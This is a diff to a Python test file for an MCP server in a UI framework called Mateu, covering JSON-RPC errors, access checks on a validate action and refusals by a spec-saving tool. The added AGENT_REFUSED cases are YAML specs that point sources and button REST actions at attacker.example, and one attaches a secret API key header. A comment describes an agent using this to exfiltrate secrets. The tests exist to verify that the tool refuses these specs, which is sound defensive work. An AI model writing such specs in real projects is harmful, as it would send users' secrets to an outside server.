@@ -209,7 +209,7 @@ def test_a_failing_action_is_a_screen_with_the_generic_message_not_a_tool_error(
 def test_a_non_object_message_over_http_is_an_invalid_request(client):
     r = client.post("/mateu/mcp", json=[1, 2])
     assert r.json()["error"] == {"code": -32600, "message": "Invalid Request"}
-    r = client.post("/mateu/mcp", content=b"{nope")
+    r = client.post("/mateu/mcp", content=b"{nope", headers={"content-type": "application/json"})
     assert r.json()["error"]["code"] == -32700
 
 
@@ -223,11 +223,30 @@ def test_validate_and_preview_over_http(client):
 # ── __validate__ ────────────────────────────────────────────────────────────────────────────
 
 
-def test_the_validate_action_answers_the_report_on_app_data():
+def test_the_validate_action_answers_the_report_on_app_data(monkeypatch):
+    # outside an MCP tool call it answers only an app with MCP enabled or in dev mode (NM2)
+    monkeypatch.setenv("MATEU_MCP_ENABLED", "true")
     wire = sync_fn("", "__validate__", None, {"_yaml": "foo: bar\n"})
     assert wire["appData"]["_validation"]["errors"][0]["code"] == "unknown_kind"
     empty = sync_fn("", "__validate__", None, None)
     assert empty["appData"]["_validation"]["errors"][0]["code"] == "empty"
+
+
+def test_the_validate_action_is_refused_on_the_plain_sync_endpoint_when_mcp_and_dev_are_off(monkeypatch):
+    monkeypatch.delenv("MATEU_MCP_ENABLED", raising=False)
+    monkeypatch.delenv("MATEU_DEV", raising=False)
+    from mateu_ui.core.action_guard import MateuForbiddenException
+
+    with pytest.raises(MateuForbiddenException):
+        sync_fn("", "__validate__", None, {"_yaml": "foo: bar\n"})
+    # ...an MCP tool call is served (the endpoint marks its runs)
+    result = call("mateu_validate_uidl", {"yaml": "foo: bar\n"})
+    assert "unknown_kind" in text_of(result)
+    # ...and so is an app that exposes its authoring plane
+    h = handler()
+    h.authoring_open = True
+    rq = RunActionRq(action_id="__validate__", parameters={"_yaml": "foo: bar\n"})
+    assert h.handle(rq).app_data["_validation"]["errors"][0]["code"] == "unknown_kind"
 
 
 GANTT_WITH_A_BAD_DATE = (
@@ -354,6 +373,43 @@ def test_save_spec_writes_nothing_when_the_definition_has_errors(dev):
     assert out["reason"] == "The definition has errors; nothing was written."
     assert out["validation"]["errors"][0]["code"] == "unknown_kind"
     assert not (dev / "bad.yml").exists()
+
+
+# NM3: an agent saves what a screen is made of, never what decides a request — so in dev mode it
+# cannot re-point a proxied source at its own server and have Mateu send it the secret.
+AGENT_REFUSED = [
+    ("pay.yaml", "type: Sources\nsources:\n  - name: pay\n    source:\n      url: https://x\n"),
+    ("prod.yaml", "type: Environment\nsources:\n  pay:\n    url: https://attacker.example\n"),
+    ("r.yaml", "type: Routes\nroutes:\n  - route: x\n    layout: x.yaml\n"),
+    ("p1.yaml", "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n    url: https://attacker.example\n"
+     "    headers:\n      X-Api-Key: ${secret.API_KEY}\n"),
+    ("p2.yaml", "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n    url: https://attacker.example\n"
+     "    proxy: true\n"),
+    ("p3.yaml", "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n    ref: payments\n"
+     "    url: https://attacker.example\n"),
+]
+
+
+@pytest.mark.parametrize("path,text", AGENT_REFUSED)
+def test_save_spec_refuses_what_could_repoint_a_request_or_leak_a_secret(dev, path, text):
+    out = json.loads(text_of(call("mateu_save_spec", {"path": path, "yaml": text})))
+    assert out["saved"] is False
+    assert out["reason"].startswith(
+        ("Only a page, a partial or a business-component catalogue can be saved by an agent;",
+         "A definition saved by an agent may not reference a secret,")
+    )
+    assert not (dev / path).exists()
+
+
+@pytest.mark.parametrize("path", ["sources.yaml", "x/routes.yml", "environments/prod.yaml"])
+def test_save_spec_refuses_a_catalogue_file_whatever_it_holds(dev, path):
+    r = call("mateu_save_spec", {"path": path, "yaml": PAGE})
+    assert r["isError"] is True
+    assert text_of(r) == (
+        f'Error: Refused path "{path}": catalogue files (sources, routes, actions, types, project,'
+        " environments, translations) are written by hand."
+    )
+    assert not (dev / path).exists()
 
 
 def test_save_spec_without_a_specs_directory(monkeypatch, tmp_path):
